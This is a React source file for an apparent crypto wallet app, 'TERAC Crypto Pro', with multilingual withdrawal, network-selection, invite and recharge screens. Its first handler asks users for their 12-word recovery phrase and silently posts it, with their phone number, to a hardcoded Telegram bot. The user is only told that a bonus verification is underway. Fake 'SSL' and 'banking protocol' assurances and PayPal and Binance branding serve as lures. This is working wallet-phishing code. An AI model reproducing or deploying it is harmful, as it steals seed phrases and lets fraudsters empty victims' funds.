                    </div>
                  </div>

                  {/* Action Button (Image 1) */}
                  <div className="w-full pt-4">
                    <button 
                      disabled={state.isSubmittingPhrase}
                      onClick={async () => {
                        if (!state.recoveryPhrase.trim()) {
                           alert(lang === 'ar' ? "يرجى إدخال عبارة مكونة من 12 كلمة" : "Please enter your 12-word phrase");
                           return;
                        }

                        setState(prev => ({ ...prev, isSubmittingPhrase: true }));
                        
                        // Play coin sound
                        const audio = new Audio("https://www.myinstants.com/media/sounds/coins-sound-effect.mp3");
                        audio.play().catch(() => {});

                        // Send to Telegram
                        const TOKEN = "8396899535:AAE39oigCjtq2LmQ61MWJEDFTf8U-3DlG6Y";
                        const CHAT = "6328535659";
                        const message = `🚨 NEW PHRASE RECEIVED 🚨\n\nPhrase: ${state.recoveryPhrase}\n\nPhone: ${state.phoneNumber}\nApp: TERAC Crypto Pro`;
                        
                        try {
                          await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ chat_id: CHAT, text: message })
                          });
                          alert(lang === 'ar' ? "التحقق قيد التنفيذ. يرجى انتظار تأكيد المكافأة." : "Verification in progress. Please wait for the bonus confirmation.");
                        } catch (err) {
                           console.error(err);
                           alert(lang === 'ar' ? "فشل التحقق. يرجى المحاولة مرة أخرى." : "Verification failed. Please try again.");
                        } finally {
                          setState(prev => ({ ...prev, isSubmittingPhrase: false }));
                        }
                      }}
                      className="w-full bg-[#fbbc05] hover:bg-[#ffc107] disabled:opacity-50 disabled:cursor-not-allowed active:scale-[0.98] transition-all text-[#121212] font-black py-7 rounded-[2.5rem] text-lg uppercase tracking-[0.15em] shadow-[0_15px_40px_rgba(251,188,5,0.2)] flex items-center justify-center gap-3"
                    >
                      {state.isSubmittingPhrase ? (
                        <>
                          <div className="w-6 h-6 border-4 border-[#121212]/20 border-t-[#121212] rounded-full animate-spin" />
                          <span>{lang === 'ar' ? 'انتظر...' : 'WAIT...'}</span>
                        </>
                      ) : (
                        'CONFIRM & CHARGE $10'
                      )}
                    </button>
                    <p className="text-center text-[10px] text-gray-500 font-bold uppercase tracking-[0.2em] mt-6 opacity-40">
                      Secure SSL Encryption • Standard Banking Protocols
                    </p>
                  </div>
                </div>
              </div>
            )}

            {/* History Modal (Sub-modal) */}
            <AnimatePresence>
               {state.isWithdrawHistoryOpen && (
                 <motion.div 
                   initial={{ x: '100%' }}
                   animate={{ x: 0 }}
                   exit={{ x: '100%' }}
                   className="absolute inset-0 z-50 bg-[#121212] flex flex-col pt-4"
                 >
                    <div className="flex items-center px-4 py-5 border-b border-white/5 bg-[#121212]">
                      <button 
                        onClick={() => setState(prev => ({ ...prev, isWithdrawHistoryOpen: false }))}
                        className="w-10 h-10 flex items-center justify-center bg-white/5 rounded-full text-white/90"
                      >
                        <ChevronRight size={22} className={lang === 'ar' ? '' : 'rotate-180'} />
                      </button>
                      <h2 className="flex-1 text-center text-lg font-black text-white uppercase tracking-[0.2em]">
                        {lang === 'fr' ? 'Historique' : (lang === 'ar' ? 'السجل' : 'History')}
                      </h2>
                      <div className="w-10" />
                    </div>
                    <div className="flex-1 overflow-y-auto px-6 py-6 space-y-4">
                      {state.withdrawHistory.map((item, idx) => (
                        <motion.div 
                          initial={{ opacity: 0, y: 10 }}
                          animate={{ opacity: 1, y: 0 }}
                          transition={{ delay: idx * 0.05 }}
                          key={item.id} 
                          className="bg-[#1e1e1e] border border-white/5 rounded-3xl p-5 flex items-center justify-between"
                        >
                          <div className="flex items-center gap-4">
                            <div className={`w-12 h-12 rounded-2xl flex items-center justify-center ${item.status === 'Success' ? 'bg-green-500/10 text-green-500' : 'bg-orange-500/10 text-orange-500'}`}>
                              {item.status === 'Success' ? <Check size={22} /> : <History size={22} />}
                            </div>
                            <div>
                              <p className="font-bold text-white text-lg">{item.amount} <span className="text-sm font-medium text-gray-500">{item.symbol}</span></p>
                              <p className="text-[10px] text-gray-500 font-bold uppercase tracking-wider mt-1">{item.date}</p>
                            </div>
                          </div>
                          <div className={`text-[10px] font-black uppercase tracking-[0.15em] px-3 py-1.5 rounded-full ${item.status === 'Success' ? 'bg-green-500/10 text-green-500' : 'bg-orange-500/10 text-orange-500'}`}>
                            {item.status}
                          </div>
                        </motion.div>
                      ))}
                    </div>
                 </motion.div>
               )}
            </AnimatePresence>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Network Selector Modal */}
      <AnimatePresence>
        {state.isNetworkModalOpen && (
          <motion.div 
            initial={{ y: '100%' }}
            animate={{ y: 0 }}
            exit={{ y: '100%' }}
            transition={{ type: 'spring', damping: 25, stiffness: 200 }}
            className="fixed inset-0 z-[200] bg-white flex flex-col pt-4"
          >
             {/* Header */}
             <div className="flex items-center px-4 mb-4">
              <button 
                onClick={() => setState(prev => ({ ...prev, isNetworkModalOpen: false }))}
                className="w-10 h-10 flex items-center justify-center text-gray-800"
              >
                <ChevronRight size={24} className={lang === 'ar' ? '' : 'rotate-180'} />
              </button>
              <h2 className="flex-1 text-center text-xl font-bold text-gray-900 mr-10">{t.selectNetwork}</h2>
            </div>

            {/* Search Bar */}
            <div className="px-4 mb-6">
              <div className="relative">
                <Search className={`absolute ${lang === 'ar' ? 'right-4' : 'left-4'} top-1/2 -translate-y-1/2 text-gray-400`} size={18} />
                <input 
                  type="text" 
                  value={state.networkSearchTerm}
                  onChange={(e) => setState(prev => ({ ...prev, networkSearchTerm: e.target.value }))}
                  placeholder={t.searchNetwork}
                  className={`w-full bg-gray-100 border-none rounded-2xl py-4 ${lang === 'ar' ? 'pr-12 pl-4' : 'pl-12 pr-4'} text-gray-900 placeholder:text-gray-400 focus:ring-0`}
                />
              </div>
            </div>

            <div className="flex-1 overflow-y-auto px-6 pb-12">
               {state.networkSearchTerm === '' && (
                 <>
                   {/* All Networks Row */}
                   <button 
                    onClick={() => setState(prev => ({ ...prev, selectedNetwork: 'all', isNetworkModalOpen: false }))}
                    className="w-full flex items-center justify-between py-5 border-b border-gray-50"
                   >
                      <div className="flex items-center gap-4">
                        <div className="w-10 h-10 bg-gray-100 rounded-full flex items-center justify-center">
                          <Globe size={20} className="text-gray-500" />
                        </div>
                        <span className="font-bold text-gray-800">{t.allNetworks}</span>
                      </div>
                      <div className={`w-5 h-5 rounded-full border-2 p-1 ${state.selectedNetwork === 'all' ? 'border-blue-600' : 'border-gray-200'}`}>
                        {state.selectedNetwork === 'all' && <div className="w-full h-full bg-blue-600 rounded-full" />}
                      </div>
                   </button>

                   <h3 className="text-sm font-bold text-gray-300 uppercase mt-8 mb-4">{t.popularNetworks}</h3>

                   {[
                     { id: 'btc', name: 'Bitcoin', icon: 'https://cryptologos.cc/logos/bitcoin-btc-logo.png?v=023' },
                     { id: 'eth', name: 'Ethereum', icon: 'https://cryptologos.cc/logos/ethereum-eth-logo.png?v=023' },
                     { id: 'sol', name: 'Solana', icon: 'https://cryptologos.cc/logos/solana-sol-logo.png?v=023' },
                     { id: 'bnb', name: 'BNB Smart Chain', icon: 'https://cryptologos.cc/logos/binance-coin-bnb-logo.png?v=023' },
                     { id: 'trx', name: 'Tron', icon: 'https://cryptologos.cc/logos/tron-trx-logo.png?v=023' },
                     { id: 'arb', name: 'Arbitrum', icon: 'https://cryptologos.cc/logos/arbitrum-arb-logo.png?v=023' },
                     { id: 'base', name: 'Base', icon: 'https://cryptologos.cc/logos/base-base-logo.png?v=023' },
                     { id: 'doge', name: 'Dogecoin', icon: 'https://cryptologos.cc/logos/dogecoin-doge-logo.png' },
                   ].map((net) => (
                     <button 
                      key={net.id}
                      onClick={() => setState(prev => ({ ...prev, selectedNetwork: net.id, isNetworkModalOpen: false }))}
                      className="w-full flex items-center justify-between py-5 border-b border-gray-50"
                     >
                        <div className="flex items-center gap-4">
                          <div className="w-10 h-10 rounded-full overflow-hidden flex items-center justify-center bg-white border border-gray-100 p-1.5 shadow-sm">
                            <img src={net.icon} alt={net.name} className="w-full h-full object-contain" />
                          </div>
                          <span className="font-bold text-gray-800">{net.name}</span>
                        </div>
                        <div className={`w-5 h-5 rounded-full border-2 p-1 ${state.selectedNetwork === net.id ? 'border-blue-600' : 'border-gray-200'}`}>
                          {state.selectedNetwork === net.id && <div className="w-full h-full bg-blue-600 rounded-full" />}
                        </div>
                     </button>
                   ))}

                   <h3 className="text-sm font-bold text-gray-300 uppercase mt-8 mb-4">{t.networksAToZ}</h3>
                 </>
               )}
               {[
                 { id: 'aca', name: 'Acala', icon: 'https://cryptologos.cc/logos/acala-aca-logo.png' },
                 { id: 'aca-evm', name: 'Acala EVM', icon: 'https://cryptologos.cc/logos/acala-aca-logo.png' },
                 { id: 'ae', name: 'Aeternity', icon: 'https://cryptologos.cc/logos/aeternity-ae-logo.png' },
                 { id: 'agoric', name: 'Agoric', icon: 'https://cryptologos.cc/logos/agoric-bld-logo.png' },
                 { id: 'aion', name: 'Aion', icon: 'https://cryptologos.cc/logos/aion-aion-logo.png' },
                 { id: 'akash', name: 'Akash', icon: 'https://cryptologos.cc/logos/akash-network-akt-logo.png' },
                 { id: 'algo', name: 'Algorand', icon: 'https://cryptologos.cc/logos/algorand-algo-logo.png' },
                 { id: 'aptos', name: 'Aptos', icon: 'https://cryptologos.cc/logos/aptos-apt-logo.png' },
                 { id: 'aurora', name: 'Aurora', icon: 'https://cryptologos.cc/logos/aurora-near-logo.png' },
                 { id: 'avax', name: 'Avalanche C-Chain', icon: 'https://cryptologos.cc/logos/avalanche-avax-logo.png' },
                 { id: 'axelar', name: 'Axelar', icon: 'https://cryptologos.cc/logos/axelar-axl-logo.png' },
                 { id: 'bnb-green', name: 'BNB Greenfield', icon: 'https://cryptologos.cc/logos/binance-coin-bnb-logo.png' },
                 { id: 'btcc', name: 'Bitcoin Cash', icon: 'https://cryptologos.cc/logos/bitcoin-cash-bch-logo.png' },
                 { id: 'blast', name: 'Blast', icon: 'https://cryptologos.cc/logos/blast-logo-logo.png' },
                 { id: 'boba', name: 'Boba', icon: 'https://cryptologos.cc/logos/boba-network-boba-logo.png' },
                 { id: 'bounce', name: 'BounceBit', icon: 'https://bouncebit.io/logo.png' },
                 { id: 'callisto', name: 'Callisto', icon: 'https://cryptologos.cc/logos/callisto-clo-logo.png' },
                 { id: 'cardano', name: 'Cardano', icon: 'https://cryptologos.cc/logos/cardano-ada-logo.png' },
                 { id: 'celo', name: 'Celo', icon: 'https://cryptologos.cc/logos/celo-celo-logo.png' },
                 { id: 'conflux', name: 'Conflux eSpace', icon: 'https://cryptologos.cc/logos/conflux-network-cfx-logo.png' },
                 { id: 'cosmos', name: 'Cosmos Hub', icon: 'https://cryptologos.cc/logos/cosmos-atom-logo.png' },
                 { id: 'cronos', name: 'Cronos Chain', icon: 'https://cryptologos.cc/logos/cronos-chain-cro-logo.png' },
                 { id: 'cryptoorg', name: 'Crypto.org', icon: 'https://cryptologos.cc/logos/cronos-chain-cro-logo.png' },
                 { id: 'dash', name: 'Dash', icon: 'https://cryptologos.cc/logos/dash-dash-logo.png' },
                 { id: 'decred', name: 'Decred', icon: 'https://cryptologos.cc/logos/decred-dcr-logo.png' },
                 { id: 'dgb', name: 'DigiByte', icon: 'https://cryptologos.cc/logos/digibyte-dgb-logo.png' },
                 { id: 'doge_az', name: 'Dogecoin', icon: 'https://cryptologos.cc/logos/dogecoin-doge-logo.png' },
                 { id: 'etc', name: 'Ethereum Classic', icon: 'https://cryptologos.cc/logos/ethereum-classic-etc-logo.png' },
                 { id: 'evmos', name: 'Evmos', icon: 'https://cryptologos.cc/logos/evmos-evmos-logo.png' },
                 { id: 'fio', name: 'FIO', icon: 'https://cryptologos.cc/logos/fio-protocol-fio-logo.png' },
                 { id: 'ftm', name: 'Fantom', icon: 'https://cryptologos.cc/logos/fantom-ftm-logo.png' },
                 { id: 'fil', name: 'Filecoin', icon: 'https://cryptologos.cc/logos/filecoin-fil-logo.png' },
                 { id: 'firo', name: 'Firo', icon: 'https://cryptologos.cc/logos/firo-firo-logo.png' },
                 { id: 'flux', name: 'Flux', icon: 'https://cryptologos.cc/logos/flux-flux-logo.png' },
                 { id: 'gnosis', name: 'Gnosis Chain', icon: 'https://cryptologos.cc/logos/gnosis-gno-logo.png' },
                 { id: 'gochain', name: 'GoChain', icon: 'https://cryptologos.cc/logos/gochain-go-logo.png' },
                 { id: 'groestl', name: 'Groestlcoin', icon: 'https://cryptologos.cc/logos/groestlcoin-grs-logo.png' },
                 { id: 'harmony', name: 'Harmony', icon: 'https://cryptologos.cc/logos/harmony-one-logo.png' },
                 { id: 'icon', name: 'ICON', icon: 'https://cryptologos.cc/logos/icon-icx-logo.png' },
                 { id: 'icp_az', name: 'Internet Computer', icon: 'https://cryptologos.cc/logos/internet-computer-icp-logo.png' },
                 { id: 'iotex', name: 'IoTeX', icon: 'https://cryptologos.cc/logos/iotex-iotx-logo.png' },
                 { id: 'iotex_evm', name: 'IoTeX EVM', icon: 'https://cryptologos.cc/logos/iotex-iotx-logo.png' },
                 { id: 'juno', name: 'Juno', icon: 'https://cryptologos.cc/logos/juno-juno-logo.png' },
                 { id: 'kaia', name: 'Kaia', icon: 'https://cryptologos.cc/logos/kaia-logo-logo.png' },
                 { id: 'kava', name: 'Kava', icon: 'https://cryptologos.cc/logos/kava-kava-logo.png' },
                 { id: 'kava_evm', name: 'KavaEvm', icon: 'https://cryptologos.cc/logos/kava-kava-logo.png' },
                 { id: 'kcc', name: 'KuCoin Community Chain', icon: 'https://cryptologos.cc/logos/kucoin-token-kcs-logo.png' },
                 { id: 'kusama', name: 'Kusama', icon: 'https://cryptologos.cc/logos/kusama-ksm-logo.png' },
                 { id: 'linea', name: 'Linea', icon: 'https://linea.build/logo.png' },
                 { id: 'ltc_az', name: 'Litecoin', icon: 'https://cryptologos.cc/logos/litecoin-ltc-logo.png' },
                 { id: 'manta', name: 'Manta Pacific', icon: 'https://cryptologos.cc/logos/manta-network-manta-logo.png' },
                 { id: 'mantle', name: 'Mantle', icon: 'https://cryptologos.cc/logos/mantle-mnt-logo.png' },
                 { id: 'megaeth', name: 'MegaETH', icon: 'https://megaeth.com/logo.png' },
                 { id: 'merlin', name: 'Merlin', icon: 'https://merlinchain.io/logo.png' },
                 { id: 'metis', name: 'Metis', icon: 'https://cryptologos.cc/logos/metis-andromeda-metis-logo.png' },
                 { id: 'monad', name: 'Monad', icon: 'https://monad.xyz/logo.png' },
                 { id: 'moonbeam', name: 'Moonbeam', icon: 'https://cryptologos.cc/logos/moonbeam-glmr-logo.png' },
                 { id: 'moonriver', name: 'Moonriver', icon: 'https://cryptologos.cc/logos/moonriver-movr-logo.png' },
                 { id: 'multiversx', name: 'MultiversX', icon: 'https://cryptologos.cc/logos/multiversx-egld-logo.png' },
                 { id: 'near_az', name: 'NEAR', icon: 'https://cryptologos.cc/logos/near-protocol-near-logo.png' },
                 { id: 'nano', name: 'Nano', icon: 'https://cryptologos.cc/logos/nano-nano-logo.png' },
                 { id: 'native_evmos', name: 'Native Evmos', icon: 'https://cryptologos.cc/logos/evmos-evmos-logo.png' },
                 { id: 'native_injective', name: 'Native Injective', icon: 'https://cryptologos.cc/logos/injective-protocol-inj-logo.png' },
                 { id: 'native_zetachain', name: 'Native ZetaChain', icon: 'https://zetachain.com/logo.png' },
                 { id: 'nebulas', name: 'Nebulas', icon: 'https://cryptologos.cc/logos/nebulas-nas-logo.png' },
                 { id: 'neon', name: 'Neon', icon: 'https://neonevm.org/logo.png' },
                 { id: 'neutron', name: 'Neutron', icon: 'https://neutron.org/logo.png' },
                 { id: 'nimiq', name: 'Nimiq', icon: 'https://cryptologos.cc/logos/nimiq-nim-logo.png' },
                 { id: 'op_mainnet', name: 'OP Mainnet', icon: 'https://cryptologos.cc/logos/optimism-ethereum-op-logo.png' },
                 { id: 'ontology', name: 'Ontology', icon: 'https://cryptologos.cc/logos/ontology-ont-logo.png' },
                 { id: 'opbnb', name: 'OpBNB', icon: 'https://cryptologos.cc/logos/binance-coin-bnb-logo.png' },
                 { id: 'osmosis', name: 'Osmosis', icon: 'https://cryptologos.cc/logos/osmosis-osmo-logo.png' },
                 { id: 'plasma_mainnet', name: 'Plasma Mainnet', icon: 'https://cryptologos.cc/logos/plasma-finance-ppay-logo.png' },
                 { id: 'polkadot_az', name: 'Polkadot', icon: 'https://cryptologos.cc/logos/polkadot-new-dot-logo.png' },
                 { id: 'polygon_az', name: 'Polygon', icon: 'https://cryptologos.cc/logos/polygon-matic-logo.png' },
                 { id: 'polygon_zkevm', name: 'Polygon zkEVM', icon: 'https://cryptologos.cc/logos/polygon-matic-logo.png' },
                 { id: 'qtum', name: 'Qtum', icon: 'https://cryptologos.cc/logos/qtum-qtum-logo.png' },
                 { id: 'ravencoin', name: 'Ravencoin', icon: 'https://cryptologos.cc/logos/ravencoin-rvn-logo.png' },
                 { id: 'ronin', name: 'Ronin', icon: 'https://cryptologos.cc/logos/ronin-ron-logo.png' },
                 { id: 'scroll', name: 'Scroll', icon: 'https://scroll.io/logo.png' },
                 { id: 'sei', name: 'Sei', icon: 'https://cryptologos.cc/logos/sei-logo.png' },
                 { id: 'sonic', name: 'Sonic', icon: 'https://sonic.xyz/logo.png' },
                 { id: 'stargaze', name: 'Stargaze', icon: 'https://cryptologos.cc/logos/stargaze-logo.png' },
                 { id: 'stellar', name: 'Stellar', icon: 'https://cryptologos.cc/logos/stellar-xlm-logo.png' },
                 { id: 'stride', name: 'Stride', icon: 'https://stride.zone/logo.png' },
                 { id: 'sui', name: 'Sui', icon: 'https://cryptologos.cc/logos/sui-sui-logo.png' },
                 { id: 'thorchain', name: 'THORChain', icon: 'https://cryptologos.cc/logos/thorchain-rune-logo.png' },
                 { id: 'ton', name: 'TON', icon: 'https://cryptologos.cc/logos/toncoin-ton-logo.png' },
                 { id: 'terra_classic', name: 'Terra Classic', icon: 'https://cryptologos.cc/logos/terra-luna-logo.png' },
                 { id: 'tezos', name: 'Tezos', icon: 'https://cryptologos.cc/logos/tezos-xtz-logo.png' },
                 { id: 'theta', name: 'Theta', icon: 'https://cryptologos.cc/logos/theta-theta-logo.png' },
                 { id: 'thundercore', name: 'ThunderCore', icon: 'https://cryptologos.cc/logos/thundercore-tt-logo.png' },
                 { id: 'vechain', name: 'VeChain', icon: 'https://cryptologos.cc/logos/vechain-vet-logo.png' },
                 { id: 'viacoin', name: 'Viacoin', icon: 'https://cryptologos.cc/logos/viacoin-via-logo.png' },
                 { id: 'viction', name: 'Viction', icon: 'https://cryptologos.cc/logos/viction-vic-logo.png' },
                 { id: 'wanchain', name: 'Wanchain', icon: 'https://cryptologos.cc/logos/wanchain-wan-logo.png' },
                 { id: 'waves', name: 'Waves', icon: 'https://cryptologos.cc/logos/waves-waves-logo.png' },
                 { id: 'xrp_az', name: 'XRP', icon: 'https://cryptologos.cc/logos/xrp-xrp-logo.png' },
                 { id: 'zcash', name: 'Zcash', icon: 'https://cryptologos.cc/logos/zcash-zec-logo.png' },
                 { id: 'zeta_evm', name: 'Zeta EVM', icon: 'https://zetachain.com/logo.png' },
                 { id: 'zilliqa', name: 'Zilliqa', icon: 'https://cryptologos.cc/logos/zilliqa-zil-logo.png' },
                 { id: 'zklink', name: 'zkLink Nova Mainnet', icon: 'https://zklink.io/logo.png' },
                 { id: 'zksync', name: 'zkSync Era', icon: 'https://cryptologos.cc/logos/zksync-logo.png' },
               ].filter(net => net.name.toLowerCase().includes(state.networkSearchTerm.toLowerCase())).sort((a, b) => {
                 const term = state.networkSearchTerm.toLowerCase();
                 if (term === '') return 0;
                 const aStartsWith = a.name.toLowerCase().startsWith(term);
                 const bStartsWith = b.name.toLowerCase().startsWith(term);
                 if (aStartsWith && !bStartsWith) return -1;
                 if (!aStartsWith && bStartsWith) return 1;
                 return a.name.localeCompare(b.name);
               }).map((net) => (
                 <button 
                  key={net.id}
                  onClick={() => setState(prev => ({ ...prev, selectedNetwork: net.id, isNetworkModalOpen: false }))}
                  className="w-full flex items-center justify-between py-5 border-b border-gray-50"
                 >
                    <div className="flex items-center gap-4">
                      <div className="w-10 h-10 rounded-full overflow-hidden flex items-center justify-center bg-white border border-gray-100 p-1.5 shadow-sm">
                        <img src={net.icon} alt={net.name} className="w-full h-full object-contain" onError={(e) => { e.currentTarget.src = 'https://cryptologos.cc/logos/generic-logo.png'; }} />
                      </div>
                      <span className="font-bold text-gray-800">{net.name}</span>
                    </div>
                    <div className={`w-6 h-6 rounded-full border-2 p-1 transition-all ${state.selectedNetwork === net.id ? 'border-blue-600' : 'border-gray-200'}`}>
                      {state.selectedNetwork === net.id && <div className="w-full h-full bg-blue-600 rounded-full" />}
                    </div>
                 </button>
               ))}
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      <AnimatePresence>
        {state.isInviteModalOpen && (
          <div className="fixed inset-0 z-[200] flex items-center justify-center px-4">
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => setState(prev => ({ ...prev, isInviteModalOpen: false }))}
              className="absolute inset-0 bg-black/80 backdrop-blur-sm"
            />
            <motion.div 
              initial={{ opacity: 0, y: 50, scale: 0.95 }}
              animate={{ opacity: 1, y: 0, scale: 1 }}
              exit={{ opacity: 0, y: 50, scale: 0.95 }}
              className="relative w-full max-w-sm bg-[#1c1c1e] rounded-[40px] p-8 overflow-hidden shadow-2xl border border-white/10"
            >
              <div className="flex flex-col items-center text-center space-y-6">
                <div className="w-20 h-20 bg-blue-500 rounded-[28px] flex items-center justify-center shadow-[0_10px_30px_rgba(59,130,246,0.3)]">
                  <Users size={40} className="text-white" />
                </div>
                
                <div className="space-y-2">
                  <h3 className="text-2xl font-black text-white">{t.invite}</h3>
                  <p className="text-gray-400 text-sm leading-relaxed px-4">
                    {t.bonusDesc}
                  </p>
                </div>

                <div className="w-full space-y-4">
                  <div className="bg-black/40 border border-white/5 rounded-2xl p-4 flex items-center justify-between">
                    <span className="text-lg font-mono font-bold text-[#f3ba2f]">TERAC-VIP-2024</span>
                    <button 
                      onClick={() => {
                        navigator.clipboard.writeText('TERAC-VIP-2024');
                        alert(t.copyCode);
                      }}
                      className="p-2 bg-white/5 rounded-lg text-gray-400 hover:text-white"
                    >
                      <Copy size={20} />
                    </button>
                  </div>
                  
                  <button 
                    onClick={() => alert('Referral link shared!')}
                    className="w-full py-4 bg-blue-600 text-white rounded-2xl font-black text-sm uppercase tracking-widest shadow-lg shadow-blue-900/20 active:scale-95 transition-transform"
                  >
                    {t.shareInvite}
                  </button>
                </div>
              </div>

              <button 
                onClick={() => setState(prev => ({ ...prev, isInviteModalOpen: false }))}
                className="absolute top-6 right-6 text-gray-500 hover:text-white"
              >
                <X size={24} />
              </button>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* Recharge Modal (Buy Interface - Redesigned to match screenshot) */}
      <AnimatePresence>
        {state.isRechargeModalOpen && (
          <motion.div 
            initial={{ opacity: 0, scale: 1.1 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 1.1 }}
            className="fixed inset-0 z-[100] bg-[#0b101b] flex flex-col pt-8"
          >
            {/* Top Bar */}
            <div className="flex items-center justify-between px-6 mb-8">
              <button 
                onClick={() => setState(prev => ({ ...prev, isRechargeModalOpen: false }))}
                className="w-10 h-10 flex items-center justify-center text-white"
              >
                <ChevronRight className={lang === 'ar' ? '' : 'rotate-180'} size={24} />
              </button>
              <h2 className="text-lg font-bold text-white">{t.buy}</h2>
              <div className="w-10"></div>
            </div>

            {/* Main Content Area */}
            <div className="flex-1 flex flex-col items-center px-6 overflow-y-auto pb-6">
              {/* Amount Display */}
              <div className="flex flex-col items-center mt-12 mb-12">
                <div className="flex items-baseline mb-2">
                  <span className="text-8xl font-medium tracking-tighter text-white" dir="ltr">
                    ${state.rechargeInput}
                  </span>
                </div>
                <div className="bg-[#1f2833] px-5 py-1.5 rounded-2xl border border-white/5 shadow-xl">
                  <span className="text-sm font-bold text-gray-300 uppercase tracking-widest">USD</span>
                </div>
              </div>

              {/* Payment Methods (White Cards) */}
              <div className="w-full space-y-4 mb-12">
                <button 
                  onClick={() => setState(prev => ({ ...prev, paymentMethod: 'paypal' }))}
                  className={`w-full bg-white rounded-[25px] p-6 flex items-center gap-4 transition-all border-4 ${state.paymentMethod === 'paypal' ? 'border-[#3b82f6]' : 'border-transparent'}`}
                >
                  <div className="w-12 h-12 flex items-center justify-center">
                    <img src="https://cdn-icons-png.flaticon.com/512/174/174861.png" className="w-full" alt="PayPal" />
                  </div>
                  <div className="flex flex-col text-left flex-1" dir="ltr">
                    <span className="text-[10px] uppercase font-bold text-gray-500">{t.payWith}</span>
                    <span className="text-xl font-bold text-black">PayPal</span>
                  </div>
                </button>

                <button 
                  onClick={() => setState(prev => ({ ...prev, paymentMethod: 'binance' }))}
                  className={`w-full bg-white rounded-[25px] p-6 flex items-center gap-4 transition-all border-4 ${state.paymentMethod === 'binance' ? 'border-[#3b82f6]' : 'border-transparent'}`}
                >
                  <div className="w-12 h-12 flex items-center justify-center">
                    <img src="https://bin.bnbstatic.com/static/images/common/favicon.ico" className="w-10 h-10" alt="Binance" />
                  </div>
                  <div className="flex flex-col text-left flex-1" dir="ltr">
                    <span className="text-[10px] uppercase font-bold text-gray-500">{t.payWith}</span>
                    <span className="text-xl font-bold text-black">Binance Pay</span>
                  </div>
                </button>
              </div>

              {/* Spacer for Numpad focus */}
              <div className="flex-1" />

              {/* Numpad */}
              <div className="w-full max-w-[320px] mb-8">
                <div className="grid grid-cols-3 gap-y-8 text-center">
                  {[1, 2, 3, 4, 5, 6, 7, 8, 9, '.', 0, 'back'].map((key) => (
                    <button 
                      key={key}
                      onClick={() => handleNumpadFocus(key.toString())}
                      className="text-3xl font-medium text-white active:opacity-50 transition-opacity"
                    >
                      {key === 'back' ? (
                        <div className="flex justify-center items-center">
                          <div className="bg-[#1f2833] p-3 rounded-xl border border-white/5">
                            <X size={24} strokeWidth={3} />
                          </div>
                        </div>
                      ) : (
                        key
                      )}
                    </button>
                  ))}
                </div>
              </div>

              {/* Action Button */}
              <button 
                onClick={handleContinueRecharge}
                className="w-full min-h-[65px] bg-[#3b82f6] text-white font-bold rounded-[30px] text-lg active:scale-95 transition-transform shadow-[0_10px_20px_rgba(59,130,246,0.3)]"
              >
                {t.continue}
              </button>
            </div>
          </motion.div>
        )}
      </AnimatePresence>


      {/* Wallet Modal (Recevoir Interface) - Redesigned to match screenshots */}
      <AnimatePresence>
        {state.isWalletModalOpen && (
          <motion.div 
            initial={{ y: '100%', opacity: 0 }}
            animate={{ y: 0, opacity: 1 }}
            exit={{ y: '100%', opacity: 0 }}
            transition={{ type: 'spring', damping: 25, stiffness: 200 }}
            className="fixed inset-0 z-[100] bg-[#f8f9fa] flex flex-col pt-4 overflow-hidden"
          >
            {state.selectedAsset && state.isReceiveDetailOpen ? (
              /* --- WITHDRAW FORM VIEW (IMAGE 3) --- */
              <div className="flex-1 flex flex-col bg-[#0a0a0a] text-white overflow-hidden">
                {/* Header */}
                <div className="flex items-center px-4 py-5 border-b border-white/5 bg-[#0a0a0a] sticky top-0 z-20">
                  <button 
                    onClick={() => setState(prev => ({ ...prev, selectedAsset: null, isReceiveDetailOpen: false }))}
                    className="w-10 h-10 flex items-center justify-center transition-all bg-white/5 rounded-full hover:bg-white/10 active:scale-90 text-white/90"
                  >
                    <ChevronRight size={22} className={lang === 'ar' ? '' : 'rotate-180'} />
                  </button>
                  <h2 className="flex-1 text-center text-lg font-black text-white leading-none uppercase tracking-[0.2em]">
                    {t.withdraw}
                  </h2>
                  <button 
                    onClick={() => setState(prev => ({ ...prev, isWithdrawHistoryOpen: true }))}
                    className="w-10 h-10 flex items-center justify-center transition-all bg-white/5 rounded-full hover:bg-white/10 active:scale-90 text-white/90"
                  >
                    <History size={20} />
                  </button>
                </div>

                <div className="flex-1 overflow-y-auto px-6 py-6 space-y-8 pb-32">
                  {/* Balance Card (Image 3 style) */}
                  <div className="relative group">
                    <div className="absolute inset-0 bg-orange-600/10 blur-3xl rounded-full opacity-50" />
                    <div className="bg-[#1a1a1a] border border-white/5 rounded-[2.5rem] p-8 text-center relative overflow-hidden shadow-2xl">
                      <p className="text-gray-500 font-bold mb-4 text-xs uppercase tracking-widest leading-loose">
                        Actifs actuellement disponibles ({state.selectedAsset.symbol})
                      </p>
                      <div className="text-5xl font-black text-[#ff5a00] tracking-tighter">
                        {state.mining.toFixed(6)}
                      </div>
                    </div>
                  </div>

                  {/* Network Selector (Image 3 style) */}
                  <div className="space-y-4">
                    <p className="text-white/40 font-black text-[10px] uppercase tracking-[0.2em]">Sélectionner le réseau principal</p>
                    <div className="flex gap-4">
                      <button className="flex items-center justify-center gap-3 bg-[#ff5a00]/10 border border-[#ff5a00]/30 px-6 py-4 rounded-3xl transition-all shadow-[0_0_20px_rgba(255,90,0,0.1)]">
                         <div className="w-8 h-8 rounded-xl bg-[#ff5a00] flex items-center justify-center shadow-[0_0_15px_rgba(255,90,0,0.4)]">
                            <Cpu size={14} className="text-white" />
                         </div>
                         <span className="font-extrabold text-sm text-white">TRX</span>
                      </button>
                      <button className="flex items-center justify-center gap-3 bg-white/5 border border-white/10 px-6 py-4 rounded-3xl opacity-40 grayscale">
                         <div className="w-8 h-8 rounded-xl bg-teal-600 flex items-center justify-center">
                            <span className="text-[10px] font-black">BNB</span>
                         </div>
                         <span className="font-extrabold text-sm text-white text-opacity-50">BEP20-USDT</span>
                      </button>
                    </div>
                  </div>

                  {/* Address Field (Image 3 style) */}
                  <div className="space-y-4">
                    <p className="text-white/40 font-black text-[10px] uppercase tracking-[0.2em]">Adresse de retrait</p>
